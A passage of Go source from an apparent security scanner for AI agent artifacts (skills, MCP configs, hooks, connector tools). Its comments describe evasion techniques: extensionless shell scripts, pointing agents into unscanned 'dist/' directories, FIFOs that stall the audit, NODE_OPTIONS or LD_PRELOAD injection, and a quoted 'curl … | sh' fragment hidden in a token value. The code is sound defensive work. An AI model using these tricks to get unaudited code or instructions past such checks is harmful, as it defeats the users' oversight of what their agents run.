			// the report can name the files without the reader ever opening them.
			if p != dir && d.Name() == "__pycache__" {
				pyc = append(pyc, pycFiles(dir, p)...)
			}
			// p == dir is the artifact's own root: an artifact that happens to be installed
			// into a directory called `dist` or `build` must not skip ITSELF into invisibility.
			// The READER'S question, not the hasher's. These are now separate lists (collect/skip.go):
			// an artifact's own build output — dist/, build/, out/ — IS read, because it is generated
			// from the code in this same tree and was the last standing evasion in the corpus. Only
			// third-party trees and VCS metadata stay unread.
			if p != dir && collect.ExcludedFromScan(d.Name()) {
				if hasEntries(p) {
					skippedDirs = append(skippedDirs, treeRel(dir, p))
				}
				return filepath.SkipDir // vendored/generated: high noise, low signal
			}
			return nil
		}
		// Boundary FIRST: the sniff below opens the file, and a file whose target escapes
		// the artifact root must not be opened at all (§16.2).
		if !inBoundary(boundary, p) {
			return nil
		}
		// Before the extension split, because a pipe is unreadable whatever it is called and
		// both branches below open the file. Aggregated into one note rather than left to
		// readCapped's per-file note, so a directory seeded with a hundred pipes costs one
		// line of the operator's attention instead of a hundred.
		if !regularFile(p) {
			nonRegular = append(nonRegular, treeRel(dir, p))
			return nil
		}
		// The extension is a FAST PATH, not the decision. It used to be the decision, and the
		// consequence was that an attacker needed no technique at all — just no `.sh` suffix.
		// `bootstrap` and `.bashrc` are the two most natural forms a shell script takes, and both
		// matched nothing in the allowlist, so both were announced as unread and left unread.
		//
		// looksTextual was already here, deciding whether the skip was worth a coverage note. It is
		// the same question ("is this readable text?"), so it now decides whether to READ. A binary
		// still is not read and still produces no note: a PNG is not an instruction, and saying so on
		// every image would drown the notes that mean something.
		if strings.EqualFold(filepath.Ext(p), ".pyc") {
			pyc = append(pyc, treeRel(dir, p)) // a loose .pyc outside __pycache__ — same finding
			return nil
		}
		if !textExts[strings.ToLower(filepath.Ext(p))] && !looksTextual(p) {
			return nil
		}
		b, note := readCapped(p, boundary)
		if note != nil {
			notes = append(notes, *note)
			return nil
		}
		if b == nil {
			// Stat, Open or Read failed after the walk had already listed the file: the same
			// "exists, could not be seen" state as the directory case above, disclosed the
			// same way.
			unreadable = append(unreadable, treeRel(dir, p))
			return nil
		}
		role := treeRole(dir, p)
		key := seenKey{sha256.Sum256(b), role}
		if seen[key] {
			return nil // identical content already scanned (mirror copy)
		}
		seen[key] = true
		units = append(units, unit{file: p, text: stripBOM(string(b)), role: role})
		return nil
	})
	if len(nonRegular) > 0 {
		notes = append(notes, nonRegularNote(dir, nonRegular))
	}
	if len(skippedDirs) > 0 {
		notes = append(notes, generatedDirResults(dir, units, skippedDirs)...)
	}
	if len(pyc) > 0 {
		sort.Strings(pyc)
		notes = append(notes, pycFinding(dir, pyc)) // dimension 5: Run routes it to the artifact
	}
	if len(unreadable) > 0 {
		notes = append(notes, unreadableNote(dir, unreadable))
	}
	return units, notes
}

// unreadableNote is the disclosure for entries the walk saw but could not read: unlistable
// directories, unopenable files. Medium, not low like the other coverage notes: a FIFO or a
// 3 MiB file is a thing that happens, but an entry that exists, is executable, and is not
// readable is a mode the artifact's author chose — and the collapsed default view prints only
// the highest severity among the notes, so at low this would hide behind "coverage note(s),
// highest low" on any machine that also has an oversized file. The score is untouched: what
// was not read cannot be scored, and this note is the record that it was not read.
//
// The list is redacted once and printed twice, the way nonRegularNote and skippedDirNote list the
// same kind of names: the entries are named by the artifact's author, and this note used to quote
// them raw into Why and the snippet — `check --md`, written to be pasted into a pull request, then
// carried a token sitting in a directory name. Not clipped: it never was, and a clip would shorten
// an ordinary long list; with nothing truncated there is no order to get wrong.
func unreadableNote(dir string, names []string) model.Finding {
	sort.Strings(names)
	const maxList = 10
	shown := names
	if len(shown) > maxList {
		shown = shown[:maxList]
	}
	list := strings.Join(shown, ", ")
	if len(names) > maxList {
		list += fmt.Sprintf(", … (%d more)", len(names)-maxList)
	}
	list = Redact(list)
	return model.Finding{
		RuleID: "COV-000", Dimension: 0, Severity: model.SevMedium, Source: model.SrcStatic,
		Title: "Entries in this artifact could not be read (incomplete coverage)",
		Why: fmt.Sprintf("%d entry/entries exist in this artifact but could not be listed or opened by this scan: %s. "+
			"A directory that is executable but not readable (mode 0111) is the sharpest case — an agent told to run "+
			"a script inside it can, this scanner cannot — and the mode bits are the author's choice. Whatever is "+
			"in there was NOT checked; the score above does not cover it. Inspect it by hand before trusting this artifact.",
			len(names), list),
		Evidence: []model.Evidence{{File: treeRel(dir, dir), Line: 0, Snippet: "unreadable: " + list}},
	}
}

// pycFiles lists the .pyc entries directly under a __pycache__ directory, tree-relative.
func pycFiles(root, dir string) []string {
	entries, err := os.ReadDir(dir)
	if err != nil {
		return nil
	}
	var out []string
	for _, e := range entries {
		if !e.IsDir() && strings.EqualFold(filepath.Ext(e.Name()), ".pyc") {
			out = append(out, treeRel(root, filepath.Join(dir, e.Name())))
		}
	}
	return out
}

// generatedDirResults turns the skipped directories into output. Two very different
// statements come out of here, and keeping them apart is the whole point:
//
//   - A skipped directory nobody points at is a DISCLOSURE (dimension 0). The agent has no
//     instruction to go in there, so the content is inert; the operator is told the reader
//     did not look, and that is all it is worth.
//   - A skipped directory this artifact points the agent INTO is a FINDING (SUP-004, scores
//     and gates). That is the attack shape: the readable half of the artifact directing the
//     agent at the half the reader was made to ignore — by a name the author chose.
//
// The earlier version reported both cases identically at dimension 0, which meant the sharp
// signal arrived in the same voice as `node_modules` existing, i.e. it arrived as noise.
func generatedDirResults(dir string, units []unit, skipped []string) []model.Finding {
	var out []model.Finding
	for _, rel := range skipped {
		ref, ok := findDirReference(units, rel)
		if !ok {
			continue
		}
		out = append(out, model.Finding{
			RuleID: "SUP-004", Dimension: 5, Severity: model.SevMedium, Source: model.SrcStatic,
			Title: "Instructions point into a directory the scan does not read",
			Why: fmt.Sprintf("%q is excluded from the scan (and from the canonical hash) because its NAME marks it as "+
				"generated or vendored content — but this artifact points the agent at a file inside it. What the agent "+
				"is being told to use was never read, and the name that made it unreadable was chosen by whoever wrote "+
				"this artifact.", filepath.ToSlash(rel)),
			Evidence: []model.Evidence{{
				File: treeRel(dir, ref.file), Line: ref.line, Snippet: redactClip(ref.text),
			}},
		})
	}
	out = append(out, skippedDirNote(dir, skipped))
	return out
}

// dirRef locates where an artifact points into a skipped directory.
type dirRef struct {
	file string
	line int
	text string
}

// findDirReference looks for a path INTO rel — the directory name followed by a separator
// and a filename. The bare word is not enough: "add node_modules to .gitignore" is prose,
// "run dist/setup.sh" is an instruction, and only the second one sends the agent anywhere.
//
// Prose docs are excluded for the same reason they are excluded from the behavior rules: a
// CHANGELOG describing a build layout is not something the agent acts on.
func findDirReference(units []unit, rel string) (dirRef, bool) {
	// The character before the name must not continue an identifier: `mydist/x` is not a
	// reference to `dist`. A leading `/` IS allowed, because `./dist/setup.sh` and
	// `$DIR/dist/setup.sh` are how relative paths are actually written — excluding it made
	// the check miss the most common spelling of the thing it exists to catch.
	re := regexp.MustCompile(`(?i)(?:^|[^A-Za-z0-9_.\-])` + regexp.QuoteMeta(filepath.ToSlash(rel)) + `/[A-Za-z0-9_.\-]+`)
	for _, u := range units {
		if u.role == roleDoc {
			continue
		}
		for i, raw := range strings.Split(u.text, "\n") {
			if line := trimLine(raw); re.MatchString(line) {
				return dirRef{file: u.file, line: i + 1, text: line}, true
			}
		}
	}
	return dirRef{}, false
}

// treeRel returns p relative to the walk root, in slash form.
//
// NOT relPath: that one resolves symlinks in the root for display purposes, which on a host
// where the root sits under a symlinked prefix (macOS /var → /private/var) makes Rel fail and
// fall back to a two-segment tail — "001/dist" instead of "dist". Harmless in a report, fatal
// here, because these strings are matched against paths written inside the artifact. WalkDir
// builds p by joining onto dir, so a plain Rel is exact by construction.
func treeRel(dir, p string) string {
	if rel, err := filepath.Rel(dir, p); err == nil {
		return filepath.ToSlash(rel)
	}
	return filepath.Base(p)
}

// hasEntries reports whether a directory contains anything at all. An empty `dist/` — a
// build output nobody has built — is not a coverage gap, and noting it would spend the
// operator's attention on nothing.
func hasEntries(dir string) bool {
	f, err := os.Open(dir)
	if err != nil {
		return false
	}
	defer f.Close()
	names, _ := f.Readdirnames(1)
	return len(names) > 0
}

// regularFile reports whether path is a regular file, i.e. whether opening it costs a bounded
// amount of time. It is the one definition of "this is safe to open" on the content side; do
// not inline the Stat at a call site instead, because the point of having it here is that
// every read path answers the question the same way.
//
// The three cases it excludes are all reachable by whoever wrote the artifact — a skill
// directory is theirs to fill:
//
//   - a FIFO: os.Open/os.ReadFile blocks until something writes, i.e. forever. This is the
//     dangerous one, because the scan does not fail, it HANGS, and a hang reports nothing.
//   - a character device (/dev/zero, /dev/random symlinked in): reads never reach EOF.
//   - a socket: errors, but only after the open.
//
// An unguarded read therefore lets the artifact under audit decide whether it gets a verdict
// at all — and since the load-time gate has no timeout of its own, a planted pipe stalls the
// gate until the editor's hook timeout fires and the skill loads unaudited. Same class of
// defect as the OOM that `collect.sumFile` was hardened against: that fix guarded the HASH
// path, this one guards the CONTENT path, and both were needed because they open files
// independently.
//
// Stat, not Lstat: it follows symlinks, which is what the surrounding walk intends — a symlink
// to a real file is a real file. Containment stays `inBoundary`'s job, not this function's.
func regularFile(path string) bool {
	fi, err := os.Stat(path)
	return err == nil && fi.Mode().IsRegular()
}

// looksTextual reports whether a file the extension allowlist does not cover is READABLE
// TEXT — i.e. whether skipping it is a real coverage gap or just a binary the engine was
// never going to read anyway. A NUL byte or invalid UTF-8 means binary, and a PNG is not
// an instruction; an extensionless `bootstrap` or a `.bashrc` is.
//
// Sniffs a prefix rather than the whole file: this runs on every unknown-extension file in
// every artifact, and the answer never needs more than the first few KiB.
func looksTextual(path string) bool {
	// Not "is it text" but "may it be opened at all" — the sniff below is an os.Open, and on
	// a FIFO that call never returns. The caller reports non-regular files separately, so
	// answering false here loses no coverage.
	if !regularFile(path) {
		return false
	}
	f, err := os.Open(path)
	if err != nil {
		return false
	}
	defer f.Close()
	buf := make([]byte, 8192)
	n, _ := f.Read(buf)
	if n == 0 {
		return false // empty or unreadable: nothing was going to be scanned either way
	}
	buf = buf[:n]
	if bytes.IndexByte(buf, 0) >= 0 {
		return false
	}
	// A read that stops mid-rune would look invalid; drop a trailing partial rune first.
	for i := 0; i < 3 && len(buf) > 0 && !utf8.Valid(buf); i++ {
		buf = buf[:len(buf)-1]
	}
	return utf8.Valid(buf)
}

// The "text files skipped by extension" coverage note lived here and is GONE, deliberately.
// It existed because the reader decided what to open from an extension allowlist, so `bootstrap`
// and `.bashrc` were announced as unread. They are read now (see readTextTree), which leaves the
// note with nothing to report — and a note that can never fire is worse than no note, because it
// reads as a layer of protection that is not there. The only remaining unread files are the ones
// looksTextual rejects as binary, which are not instructions and are deliberately silent.

// nonRegularNote reports the FIFOs, sockets and device nodes found inside an artifact.
//
// A separate note from unscannedExtNote on purpose: "the reader has no rule for .png" and
// "this artifact contains something that would have hung the reader" are different facts, and
// the second is the interesting one — an unreadable extension is an accident of the allowlist,
// a planted pipe is a choice somebody made. Dimension 0 either way: it makes the REPORT
// incomplete, it does not make the artifact more dangerous, and scoring a guess about intent
// would put non-reproducible judgement into a number that must stay reproducible.
func nonRegularNote(dir string, names []string) model.Finding {
	sort.Strings(names)
	const maxList = 10
	shown := names
	if len(shown) > maxList {
		shown = shown[:maxList]
	}
	list := strings.Join(shown, ", ")
	if len(names) > maxList {
		list += fmt.Sprintf(", … (%d more)", len(names)-maxList)
	}
	return model.Finding{
		RuleID: "COV-000", Dimension: 0, Severity: model.SevLow, Source: model.SrcStatic,
		Title: "Non-regular files not read (incomplete coverage)",
		Why: fmt.Sprintf("%d entry/entries in this artifact are named pipes, sockets or device nodes rather than "+
			"files, and were not opened: %s. Reading one is not bounded — a FIFO blocks its reader until something "+
			"writes — so an artifact that planted one could stall its own audit instead of failing it.",
			len(names), redactClip(list)),
		Evidence: []model.Evidence{{File: filepath.Base(dir), Line: 0, Snippet: redactClip(list)}},
	}
}

// GeneratedDirNoteTitle is shared by the producer and the coalescer, so the two can never
// drift on what they are matching. Exported for the report, which tells this deliberate skip apart
// from a gap in loaded content by the same constant (report.coverageVerdict).
const GeneratedDirNoteTitle = "Third-party / VCS trees not read (incomplete coverage)"

// skippedDirNote is the DISCLOSURE half (see generatedDirResults): the reader did not look
// here. The skip itself is deliberate and stays — those trees are machine-produced and
// volatile, so including them would make the canonical hash change on every rebuild, and that
// hash is the reputation database's key. But "excluded from the identity" is not a reason to
// say nothing: a scan that is silent here reads exactly like a scan that looked and found
// nothing. Run() merges these into one note for the whole scan.
func skippedDirNote(dir string, dirs []string) model.Finding {
	sort.Strings(dirs)
	const maxList = 10
	shown := dirs
	if len(shown) > maxList {
		shown = shown[:maxList]
	}
	list := strings.Join(shown, ", ")
	if len(dirs) > maxList {
		list += fmt.Sprintf(", … (%d more)", len(dirs)-maxList)
	}
	// Why is rewritten by the coalescer once every artifact has been seen; what matters here
	// is the per-artifact evidence line it carries in.
	return model.Finding{
		RuleID: "COV-000", Dimension: 0, Severity: model.SevLow, Source: model.SrcStatic,
		Title:    GeneratedDirNoteTitle,
		Why:      "Directories were not scanned because their name marks them as generated or vendored content.",
		Evidence: []model.Evidence{{File: filepath.Base(dir), Line: 0, Snippet: redactClip(list)}},
	}
}

func readOneFile(path string, role fileRole) ([]unit, []model.Finding) {
	b, note := readCapped(path, path)
	if note != nil {
		return nil, []model.Finding{*note}
	}
	if b == nil {
		// The collector handed us a path it could Stat; if it cannot be opened now, say so —
		// a single-file artifact that yields no units and no note renders as clean.
		return nil, []model.Finding{unreadableNote(filepath.Dir(path), []string{filepath.Base(path)})}
	}
	return []unit{{file: path, text: stripBOM(string(b)), role: role}}, nil
}

// stripBOM removes a UTF-8 byte-order mark at OFFSET ZERO only. There it is an encoding
// marker every editor writes and no agent reads as text; INJ-004 used to report it as a
// hidden-character injection — nine times on one machine, all on the OOXML .xsd schemas an
// official skill ships. The same code point anywhere else in the file stays: a ZWNBSP
// in the middle of a line is exactly the concealment INJ-004 exists to report, and the test
// pins both directions.
func stripBOM(s string) string {
	return strings.TrimPrefix(s, "\uFEFF")
}

// readCapped reads a file, returning a coverage note (not silence) if it exceeds the
// size cap. relFile is used for the note's evidence path.
func readCapped(path, relBase string) ([]byte, *model.Finding) {
	fi, err := os.Stat(path)
	if err != nil {
		// Left silent on purpose: hooks.go and permission.go each turn a nil return into their
		// own "it could not be read" note, which can name the reference that led here — more
		// useful than anything this function knows how to say.
		return nil, nil
	}
	// A pipe reports Size 0, so it sails through the cap below and then blocks in ReadFile
	// forever. Guarded here rather than only at the tree walk because the walk is not the
	// only way in: a single-file `check` target (readOneFile), a script named in a hook
	// command (hooks.go) and a script named in a permission grant (permission.go) all arrive
	// straight here, and each of those paths is attacker-supplied text pointing at a path.
	//
	// The Mode check is inlined rather than calling regularFile because the Stat above already
	// produced the FileInfo; regularFile is the same predicate for the callers that hold only
	// a path. Re-Statting here would also make the answer race the read below.
	if !fi.Mode().IsRegular() {
		n := model.Finding{
			RuleID: "COV-000", Dimension: 0, Severity: model.SevLow, Source: model.SrcStatic,
			Title: "Not a regular file, content scan skipped (incomplete coverage)",
			Why: "A named pipe, socket or device node is not content, and reading one is not bounded — a FIFO " +
				"blocks the reader until something writes, which would stall this scan rather than fail it. " +
				"Not opened, and said out loud rather than skipped in silence.",
			Evidence: []model.Evidence{{File: relPath(relBase, path), Line: 0, Snippet: "not a regular file, skipped"}},
		}
		return nil, &n
	}
	f, err := os.Open(path)
	if err != nil {
		return nil, nil
	}
	defer func() { _ = f.Close() }()
	// The cap is ENFORCED BY THE READ, never checked against a Stat the read does not consult.
	// os.ReadFile re-Stats after opening and sizes its buffer from THAT (os/file.go,
	// readFileContents), then appends to EOF — so testing fi.Size() upstream bounds nothing.
	// A file that grows between the two Stats is read in full, and with it goes the ceiling
	// whose whole job is to stop an artifact from OOMing its own auditor. Exactly why
	// collect.sumFile streams instead of reading whole; that fix covered the HASH path, this
	// one covers the CONTENT path, and the two open files independently.
	//
	// cap+1 rather than cap: arriving at that one extra byte is the proof the file is over,
	// and it costs a byte instead of another syscall.
	b, err := io.ReadAll(io.LimitReader(f, maxScanBytes+1))
	if err != nil {
		return nil, nil
	}
	if len(b) > maxScanBytes {
		n := model.Finding{
			RuleID: "COV-000", Dimension: 0, Severity: model.SevLow, Source: model.SrcStatic,
			Title: "File too large, content scan skipped (incomplete coverage)",
			Why:   "Files above the 1 MiB cap are not scanned line-by-line; not silently ignored.",
			// No snippet: the Title says what happened and File says to what, so a label here is a
			// third line saying neither. Coverage notes that carry a real VALUE (which script a hook
			// resolved to) put it in Snippet and the renderer shows it; these have no value to carry.
			Evidence: []model.Evidence{{File: relPath(relBase, path), Line: 0}},
		}
		return nil, &n
	}
	return b, nil
}

// MCPServerKey is the key an MCP artifact's server sits under in the server map of a.Path — its
// `mcpServers`, or the top level of a plugin file without the wrapper (mcpServerMap, P-029). The
// rule engine, the content hash and the LLM judge all find the entry through it, so the three
// cannot be reading different entries.
//
// It is MCPServer, the key collect recorded, and NOT the artifact Name: a server a plugin ships is
// named "<key> (plugin …)" so two plugins' servers stay apart in a report, and looked up by that
// name it was never found — zero units, a clean 100, no judge request — for exactly the servers a
// user installs without reading (P-021). Name is the fallback for an artifact built without
// collect, whose Name is the key. An empty MCPServer is ambiguous, though: it is also what collect
// records for a server whose key IS "", and since the key is the plugin author's to choose,
// "empty means use Name" would hand them a free way out. So "" is the key whenever the config has
// an entry under it, and only otherwise does Name stand in — "" first, because the Name collect
// gives that server (" (plugin p@mkt)") is itself a key the author can add, as a benign decoy.
// The cost is a hand-built artifact in a config that also has a "" key; collect never builds one.
func MCPServerKey(a model.ArtifactReport) string {
	if a.MCPServer != "" {
		return a.MCPServer
	}
	if _, ok := mcpEntry(a.Path, a.MCPUnwrapped, ""); ok {
		return ""
	}
	return a.Name
}

// configEntry reads section[name] of a JSON config file — one MCP server, one permissions list.
// It is the single reader behind both views of an entry (configStrings for this engine,
// ConfigLines for the LLM judge), so the two cannot be reading different bytes.
func configEntry(path, section, name string) (json.RawMessage, bool) {
	b, err := safeio.ReadFile(path, safeio.MaxConfigBytes)
	if err != nil {
		return nil, false
	}
	var doc map[string]json.RawMessage
	if json.Unmarshal(b, &doc) != nil {
		return nil, false
	}
	sec := map[string]json.RawMessage{}
	if raw, ok := doc[section]; ok {
		_ = json.Unmarshal(raw, &sec)
	}
	raw, ok := sec[name]
	return raw, ok
}

// configStrings returns the string leaves under section[name] of a JSON config file — the
// scannable content of one MCP server / hook entry. Keys are dropped and map order is Go's, so
// this is a bag of values for line rules, not a rendering to show anyone.
func configStrings(path, section, name string) []string {
	raw, ok := configEntry(path, section, name)
	if !ok {
		return nil
	}
	var strs []string
	collectStrings(raw, &strs)
	return strs
}

// ConfigLines renders section[name] as `key=value` lines: exactly the string leaves configStrings
// returns, each prefixed with where it sits in the entry (`command`, `args`, `env.DB_PASS`).
// Object keys are sorted and array elements keep their order, so the text is byte-stable from run
// to run, which configStrings' map walk is not.
//
// Exported for the LLM judge, which sends this instead of the bag of values. The keys are why:
// keyed redaction can only fire on a value whose key it can see, and a bare `hunter2` from an env
// block is indistinguishable from any other argument. Same leaves as this engine scans
// (TestConfigLines_SameLeavesAsConfigStrings), so a verdict is never about text the static pass
// did not read. Values are raw — redaction is the caller's job, at its own egress.
func ConfigLines(path, section, name string) []string {
	raw, ok := configEntry(path, section, name)
	if !ok {
		return nil
	}
	return entryLines(raw)
}

// entryLines is ConfigLines for an entry already read (MCPConfigLines reads an MCP artifact's).
func entryLines(raw json.RawMessage) []string {
	var v any
	if json.Unmarshal(raw, &v) != nil {
		return nil
	}
	var out []string
	var walk func(key string, x any)
	walk = func(key string, x any) {
		switch t := x.(type) {
		case string:
			if key == "" {
				out = append(out, t)
				return
			}
			out = append(out, key+"="+t)
		case []any:
			for _, e := range t {
				walk(key, e)
			}
		case map[string]any:
			keys := make([]string, 0, len(t))
			for k := range t {
				keys = append(keys, k)
			}
			sort.Strings(keys)
			for _, k := range keys {
				if key != "" {
					walk(key+"."+k, t[k])
					continue
				}
				walk(k, t[k])
			}
		}
	}
	walk("", v)
	return out
}

// jsonStrings wraps an entry's string leaves (configStrings' bag of values) into one synthetic
// unit of path. Marked synthetic: evidence Line is 0 (JSON values have no meaningful per-line
// number in this blob).
func jsonStrings(path string, raw json.RawMessage) []unit {
	var strs []string
	collectStrings(raw, &strs)
	if len(strs) == 0 {
		return nil
	}
	return []unit{{file: path, text: strings.Join(strs, "\n"), role: roleScript, synthetic: true, views: bareValueViews(raw)}}
}

// bareValueViews are the views of the bag of values jsonStrings builds: a value a credential key holds is on
// its line without that key, so Redact reading the line alone announces nothing and quoted the whole secret —
// `correct horse; curl … | sh` under API_TOKEN. Each such value is quoted as the member question has it
// (memberView): its head, then the marker.
func bareValueViews(raw json.RawMessage) map[string]string {
	var v any
	if json.Unmarshal(raw, &v) != nil {
		return nil
	}
	var views map[string]string
	var walk func(any)
	walk = func(x any) {
		switch t := x.(type) {
		case []any:
			for _, e := range t {
				walk(e)
			}
		case map[string]any:
			for k, e := range t {
				if s, ok := e.(string); ok {
					if view, ok := memberView(k, s); ok {
						if views == nil {
							views = map[string]string{}
						}
						views[strings.TrimSpace(s)] = view
					}
					continue
				}
				walk(e)
			}
		}
	}
	walk(v)
	return views
}

// memberView is the snippet of the value a credential key announces, quoted without its key (keyedValue, the
// question the content hash asks; envUnit quotes the line with its key the same way): the head before the
// announced byte, redacted, then the marker — the whole value from there is
// the secret, however much of it the patterns would read (P-042). No structure guard: that guard keeps an
// identity from forgetting code, while a snippet keeps the reader's secret out of the report, and a rule that
// fired on such a value is still named with its key. ok=false when the key announces nothing.
func memberView(key, value string) (string, bool) {
	at, ok := keyedValue(key, value)
	if !ok {
		return "", false
	}
	return Redact(value[:at]) + redacted, true
}

// settingsEnvUnit is envUnit for the top-level `env` block of a settings file.
func settingsEnvUnit(path string) []unit {
	b, err := safeio.ReadFile(path, safeio.MaxConfigBytes)
	if err != nil {
		return nil
	}
	var doc map[string]json.RawMessage
	if json.Unmarshal(b, &doc) != nil {
		return nil
	}
	envRaw, ok := doc["env"]
	if !ok {
		return nil
	}
	return envUnit(path, envRaw)
}

// entryEnvUnit is envUnit for the `env` of one MCP server entry.
func entryEnvUnit(path string, raw json.RawMessage) []unit {
	entry := map[string]json.RawMessage{}
	_ = json.Unmarshal(raw, &entry)
	envRaw, ok := entry["env"]
	if !ok {
		return nil
	}
	return envUnit(path, envRaw)
}

// envUnit renders a config's `env` map as KEY=VALUE lines, one synthetic unit. collectStrings
// keeps only VALUES, and for an environment block the KEY is the signal: `--require /tmp/x.js`
// is code injection under NODE_OPTIONS and an ordinary argument under args (ts-node servers start
// with `--require ts-node/register`); LD_PRELOAD's value is just a path. Keys are sorted so
// evidence is byte-stable across runs.
func envUnit(path string, envRaw json.RawMessage) []unit {
	var env map[string]any
	if json.Unmarshal(envRaw, &env) != nil || len(env) == 0 {
		return nil
	}
	keys := make([]string, 0, len(env))
	for k := range env {
		keys = append(keys, k)
	}
	sort.Strings(keys)
	lines := make([]string, 0, len(keys))
	var views map[string]string
	for _, k := range keys {
		v, _ := env[k].(string)
		lines = append(lines, k+"="+v)
		// The line reads as an assignment, and the patterns stop its value at the first space: quote the
		// member as the member question has it instead (P-042).
		if at, ok := keyedValue(k, v); ok {
			if views == nil {
				views = map[string]string{}
			}
			views[strings.TrimSpace(k+"="+v)] = Redact(k+"="+v[:at]) + redacted
		}
	}
	return []unit{{file: path, text: strings.Join(lines, "\n"), role: roleScript, synthetic: true, views: views}}
}

func collectStrings(raw json.RawMessage, out *[]string) {
	var v any
	if json.Unmarshal(raw, &v) != nil {
		return
	}
	var walk func(any)
	walk = func(x any) {
		switch t := x.(type) {
		case string:
			*out = append(*out, t)
		case []any:
			for _, e := range t {
				walk(e)
			}
		case map[string]any:
			for _, e := range t {
				walk(e)
			}
		}
	}
	walk(v)
}

// relPath returns p relative to root for evidence display. It resolves root's symlinks
// first (so /tmp vs /private/tmp doesn't produce ugly ../../../ paths), and falls back to
// the last two path segments rather than leaking a system-absolute path (review §3.6).
func relPath(root, p string) string {
	// Run hands every caller an anchored (absolute) root, while collect builds its paths from the
	// root as typed — for `--root .claude` or `check ./skill` they are relative to the working
	// directory. Rel cannot relate the two frames, and every evidence line fell back to its two-segment
	// tail. So p joins root's frame: Abs, then the directory resolved the way root is just below, so
	// a working directory reached through a symlink still lines up with the resolved root. The file's
	// own name is kept, so a symlinked script is shown by the name the artifact uses. An absolute p
	// takes none of this and is handled exactly as before.
	if filepath.IsAbs(root) && !filepath.IsAbs(p) {
		if ap, err := filepath.Abs(p); err == nil {
			p = ap
			if dir, err := filepath.EvalSymlinks(filepath.Dir(p)); err == nil {
				p = filepath.Join(dir, filepath.Base(p))
			}
		}
	}
	if rr, err := filepath.EvalSymlinks(root); err == nil {
		root = rr
	}
	if rp, err := filepath.EvalSymlinks(p); err == nil && rp == root {
		// `check <file>`: root IS the scanned file. Rel would render it "." and the tail
		// fallback would prefix it with a temp-dir name — an evidence line naming the wrong
		// thing either way. Compared after resolving both, since root is resolved above.
		return filepath.Base(p)
	}
	if rel, err := filepath.Rel(root, p); err == nil && !strings.HasPrefix(rel, "..") {
		return rel
	}
	// Escaping/unrelated path: show a short, non-leaking tail.
	dir := filepath.Base(filepath.Dir(p))
	if dir == "." || dir == string(filepath.Separator) {
		return filepath.Base(p)
	}
	return filepath.Join(dir, filepath.Base(p))
}

// clip caps a snippet to keep reports readable, on a character boundary (RunePrefix).
func clip(s string) string {
	const max = 200
	if len(s) > max {
		return RunePrefix(s, max) + "…"
	}
	return s
}

// RunePrefix returns the longest prefix of s that is at most max bytes and does not end inside a
// character: the one byte cap that cannot split a rune (P-037). Cut at a bare byte offset, a line of
// CJK or emoji past the cap ended in half a character — invalid UTF-8, which a report prints as a
// broken glyph and the judge's request is marshalled with as U+FFFD, so the endpoint read other text
// than grounding compared against. Every byte cap in detect and judge cuts through here.
//
// It backs off at most utf8.UTFMax-1 bytes, to the start of the character the cut falls in: bytes
// that are invalid already (a run of continuation bytes) are cut where they are, not eaten whole.
func RunePrefix(s string, max int) string {
	if len(s) <= max {
		return s
	}
	if max <= 0 {
		return ""
	}
	for p := max - 1; p >= 0 && p > max-utf8.UTFMax; p-- {
		if !utf8.RuneStart(s[p]) {
			continue
		}
		if _, size := utf8.DecodeRuneInString(s[p:]); p+size > max {
			return s[:p]
		}
		break
	}
	return s[:max]
}

// connectorUnits renders a connector's advertised tool list as one synthetic unit. Every line
// is prefixed with the tool it belongs to, so the evidence snippet of any hit names the tool
// without a line number (the text exists in no file at that line — it is assembled from JSON,
// like the MCP config strings, hence synthetic).
func connectorUnits(a model.ArtifactReport) []unit {
	text := ConnectorText(a.Connector)
	if text == "" {
		return nil
	}
	return []unit{{file: a.Path, text: text, role: roleToolDesc, synthetic: true}}
}

// ConnectorText is the scan's view of a connector: one line per description line, each
// prefixed "tool ▸ ", parameters as "tool ▸ param name: description". The judge sends the same
// text (judge/run.go), so the two cannot see different things.
func ConnectorText(c *model.Connector) string {
	if c == nil {
		return ""
	}
	var b strings.Builder
	for _, t := range c.Tools {
		for _, l := range strings.Split(t.Description, "\n") {
			if strings.TrimSpace(l) == "" {
				continue
			}
			b.WriteString(t.Name + " ▸ " + l + "\n")
		}
		for _, p := range t.Params {
			for _, l := range strings.Split(p.Description, "\n") {
				if strings.TrimSpace(l) == "" {
					continue
				}
				b.WriteString(t.Name + " ▸ param " + p.Name + ": " + l + "\n")
			}
		}
	}
	return b.String()
}
